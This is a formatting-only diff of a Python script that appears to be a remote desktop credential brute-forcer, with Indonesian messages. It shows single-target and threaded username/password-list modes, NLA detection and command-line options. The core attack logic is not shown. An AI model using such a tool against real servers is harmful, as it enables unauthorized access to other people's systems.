@@ -19,9 +19,7 @@ import threading
 import time
 from queue import Queue
 
-NLAS_REGISTRY_PATH = (
-    r"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL"
-)
+NLAS_REGISTRY_PATH = r"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL"
 
 print_lock = threading.Lock()
 found_credentials = []
@@ -247,7 +245,9 @@ def bruteforce_single(target: str, port: int, username: str, password: str, time
     if result == "success":
         print(f"\n[+] BERHASIL! {username}:{password} pada {target}:{port}")
     elif "nla_detected" in result:
-        print(f"\n[-] NLA terdeteksi pada server. Tidak dapat memverifikasi kredensial tanpa NLA handshake penuh.")
+        print(
+            f"\n[-] NLA terdeteksi pada server. Tidak dapat memverifikasi kredensial tanpa NLA handshake penuh."
+        )
         print(f"[*] Detail: {result}")
     elif result == "connection_failed":
         print(f"\n[!] Gagal koneksi ke {target}:{port}")
@@ -256,8 +256,9 @@ def bruteforce_single(target: str, port: int, username: str, password: str, time
         print(f"[*] Detail: {result}")
 
 
-def bruteforce_multiuser(target: str, port: int, userlist: str, passlist: str,
-                         timeout: float, threads: int) -> None:
+def bruteforce_multiuser(
+    target: str, port: int, userlist: str, passlist: str, timeout: float, threads: int
+) -> None:
     """Mode multi-user / multi-password bruteforce."""
     try:
         with open(userlist, "r", encoding="utf-8", errors="ignore") as f:
@@ -332,7 +333,9 @@ Contoh:
     parser.add_argument("--password", "-P", type=str, default=None, help="Password tunggal")
     parser.add_argument("--userlist", "-U", type=str, default=None, help="File daftar username")
     parser.add_argument("--passlist", "-L", type=str, default=None, help="File daftar password")
-    parser.add_argument("--timeout", "-t", type=float, default=5.0, help="Timeout koneksi detik (default: 5)")
+    parser.add_argument(
+        "--timeout", "-t", type=float, default=5.0, help="Timeout koneksi detik (default: 5)"
+    )
     parser.add_argument("--threads", "-Tt", type=int, default=5, help="Jumlah thread (default: 5)")
 
     args = parser.parse_args()
@@ -341,8 +344,12 @@ Contoh:
         bruteforce_single(args.target, args.port, args.username, args.password, args.timeout)
     elif args.userlist and args.passlist:
         bruteforce_multiuser(
-            args.target, args.port, args.userlist, args.passlist,
-            args.timeout, args.threads,
+            args.target,
+            args.port,
+            args.userlist,
+            args.passlist,
+            args.timeout,
+            args.threads,
         )
     else:
         parser.print_help()
